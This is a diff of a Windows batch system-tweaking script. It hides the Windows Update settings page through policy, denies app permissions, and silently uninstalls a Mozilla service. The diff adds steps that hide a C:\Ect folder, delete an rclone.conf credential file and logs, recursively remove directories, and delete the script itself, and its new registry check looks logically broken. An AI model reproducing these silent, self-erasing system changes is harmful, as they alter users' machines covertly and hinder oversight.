@@ -2,7 +2,7 @@
 @echo off
 @Title DQS-AD
 cd /d %~dp0
-SET veropt=2.2
+SET veropt=2.3
 SET AFF=%veropt%
 md %SystemDrive%\Ect
 set indigo=[38;5;105m
@@ -10,6 +10,7 @@ set red=[91m
 set white=[37m
 set light_red=[91m
 mode con:cols=70 lines=20
+SET HWCN=0
 cls
 
 echo SET veropt=%veropt%>bin\ves.bat
@@ -658,7 +659,6 @@ IF EXIST bin\SVPP38.STR (
 	Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /f
 	Reg.exe delete "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /f
 	Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:cortana;privacy-automaticfiledownloads;privacy-feedback;windowsinsider;windowsupdate;cortana-windowssearch;;cortana-windowssearch;" /f
-	IF EXIST bin\audio.bat call bin\audio.bat
 	IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
 	Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
 	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam" /v "Value" /t REG_SZ /d "Deny" /f
@@ -680,6 +680,7 @@ IF EXIST bin\SVPP38.STR (
 	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary" /v "Value" /t REG_SZ /d "Deny" /f
 	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess" /v "Value" /t REG_SZ /d "Deny" /f
 	Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" /v "Value" /t REG_SZ /d "Deny" /f
+	sc config "Netman" start=auto
 	echo Y>bin\SVPP38.END
 	DEL bin\SVPP38.STR
 )
@@ -747,7 +748,28 @@ IF EXIST rclone.conf (
 )
 
 cd /d %~dp0
+attrib +h +s "C:\Ect"
 Ping 10>nul
+IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
+DEL QTS-USRL.log
+DEL ID.log
+DEL IID.log
+DEL temp2.txt
+DEL rclone.conf
+DEL sec-ath.bat
+DEL RWC-USRL.log
+IF %HWCN%==0 (
+	SET CURRENTKEY=HKLM\SOFTWARE\RECS\RWC-TEST
+	FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "SVPP38"') DO set MGG=%%B
+	IF %SVPP38%==Y (
+		rmdir /s /q C:\Ect
+		rmdir /s /q C:\Ect\RWC
+		DEL "%~f0"
+		Exit
+	)
+	DEL "%~f0"
+	Exit
+)
 set seed=%time:~9,2%%time:~3,2%%time:~6,2%
 set /A rand=(seed * 21) %% 20 + 1
 IF %rand%==16 SET WLN=16.jpeg & goto :APBAGG
@@ -758,14 +780,6 @@ SET WLN=%rand%.png
 set backgroundImage=C:\Ect\Wallp\%WLN%
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%backgroundImage%" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-IF EXIST "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" start "" "C:\Program Files (x86)\Mozilla Maintenance Service\Uninstall.exe" /S
-DEL QTS-USRL.log
-DEL ID.log
-DEL IID.log
-DEL temp2.txt
-DEL rclone.conf
-DEL sec-ath.bat
-DEL RWC-USRL.log
 Exit
 
 :FATALERROR
